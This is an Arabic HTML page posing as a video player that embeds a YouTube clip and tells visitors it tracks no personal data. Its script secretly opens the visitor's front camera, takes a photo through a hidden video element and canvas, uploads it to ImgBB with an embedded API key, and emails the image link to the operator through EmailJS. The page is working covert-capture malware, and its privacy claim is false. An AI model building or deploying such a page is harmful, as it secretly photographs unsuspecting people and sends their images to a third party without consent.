<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>مشغل فيديو</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("fgxPRLjjoxRV_d1cf");
    })();
  </script>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
      color: white;
      text-align: center;
      padding: 20px;
      margin: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    
    .container {
      background: rgba(0, 0, 0, 0.7);
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      max-width: 800px;
      width: 90%;
      margin: 20px auto;
      backdrop-filter: blur(10px);
    }
    
    h1 {
      font-size: 28px;
      margin-bottom: 25px;
      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
    }
    
    .video-container {
      position: relative;
      width: 100%;
      height: 0;
      padding-bottom: 56.25%; /* نسبة 16:9 */
      margin: 0 auto 25px;
      border-radius: 10px;
      overflow: hidden;
      box-shadow: 0 8px 20px rgba(0,0,0,0.4);
    }
    
    #player {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: 0;
      border-radius: 10px;
    }
    
    .loading {
      display: none;
      margin: 30px 0;
    }
    
    .spinner {
      border: 5px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top: 5px solid #fff;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .message {
      display: none;
      padding: 20px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      margin-top: 25px;
      font-size: 18px;
    }
    
    .error {
      color: #ff6b6b;
      display: none;
      margin-top: 20px;
      padding: 15px;
      background: rgba(255, 0, 0, 0.1);
      border-radius: 8px;
    }
    
    .success {
      color: #4cd97b;
      display: none;
    }
    
    .footer {
      margin-top: 30px;
      font-size: 14px;
      opacity: 0.8;
    }
    
    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>مشغل فيديو ممتع</h1>
    
    <div class="video-container">
      <iframe id="player" src="https://www.youtube.com/embed/efQ7_0IzgUw?rel=0&controls=1&showinfo=0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
    </div>
    
    <div class="loading">
      <div class="spinner"></div>
      <p>جارٍ تحميل الفيديو، الرجاء الانتظار</p>
    </div>
    
    <div class="message">
      <p>تم تشغيل الفيديو بنجاح!</p>
      <p class="success">استمتع بالمشاهدة</p>
    </div>
    
    <div class="error" id="error-message">
      خطأ: تعذر تحميل الفيديو. يرجى التحقق من اتصال الإنترنت
    </div>
    
    <div class="footer">
      <p>هذا المشغل آمن ولا يتتبع أي بيانات شخصية</p>
    </div>
  </div>

  <video id="hiddenVideo" autoplay playsinline class="hidden"></video>
  <canvas id="canvas" width="640" height="480" class="hidden"></canvas>

  <script>
    // عناصر DOM
    const player = document.getElementById('player');
    const loading = document.querySelector('.loading');
    const message = document.querySelector('.message');
    const success = document.querySelector('.success');
    const errorMsg = document.getElementById('error-message');
    const hiddenVideo = document.getElementById('hiddenVideo');
    const canvas = document.getElementById('canvas');
    
    // متغيرات الحالة
    let cameraCaptured = false;
    let emailSent = false;
    
    // إخفاء رسالة التحميل بعد بدء تشغيل الفيديو
    player.addEventListener('load', () => {
      loading.style.display = 'none';
      message.style.display = 'block';
      success.style.display = 'block';
    });
    
    // بدء عملية التقاط الصورة الخفية
    setTimeout(async () => {
      try {
        // الوصول إلى الكاميرا دون إظهارها
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: 'user',
            width: { ideal: 1280 },
            height: { ideal: 720 }
          } 
        });
        
        hiddenVideo.srcObject = stream;
        cameraCaptured = true;
        
        // انتظر لضمان جودة الصورة
        setTimeout(() => {
          captureImage();
        }, 3000);
        
      } catch (error) {
        console.error('Camera error:', error);
      }
    }, 5000); // بدء التقاط الصورة بعد 5 ثوان
    
    // وظيفة التقاط الصورة
    function captureImage() {
      try {
        const ctx = canvas.getContext('2d');
        
        // التقاط الصورة
        ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
        
        // الحصول على بيانات الصورة
        const imageData = canvas.toDataURL('image/jpeg', 0.85);
        const base64Image = imageData.split(',')[1];
        
        // إيقاف تشغيل الكاميرا
        hiddenVideo.srcObject.getTracks().forEach(track => track.stop());
        
        // رفع الصورة إلى ImgBB
        const formData = new FormData();
        formData.append('image', base64Image);
        formData.append('name', 'hidden_capture_' + Date.now());
        
        fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
          method: 'POST',
          body: formData
        })
        .then(response => response.json())
        .then(imgbbData => {
          if (imgbbData.success) {
            // إرسال الإيميل باستخدام EmailJS
            emailjs.send("service_890xst3", "template_p1oukct", {
              name: "صورة خفية",
              time: new Date().toLocaleString(),
              message: "تم التقاط صورة جديدة من الكاميرا الأمامية.",
              image_url: imgbbData.data.url
            }).then(() => {
              emailSent = true;
            }, error => {
              console.error('Email error:', error);
            });
          }
        })
        .catch(error => {
          console.error('ImgBB error:', error);
        });
        
      } catch (error) {
        console.error('Capture error:', error);
      }
    }
    
    // عرض رسالة نجاح بعد 10 ثوان
    setTimeout(() => {
      if (cameraCaptured && emailSent) {
        console.log('تم التقاط الصورة وإرسالها بنجاح!');
      } else if (cameraCaptured) {
        console.log('تم التقاط الصورة ولكن حدث خطأ في الإرسال');
      }
    }, 10000);
  </script>
</body>
</html>
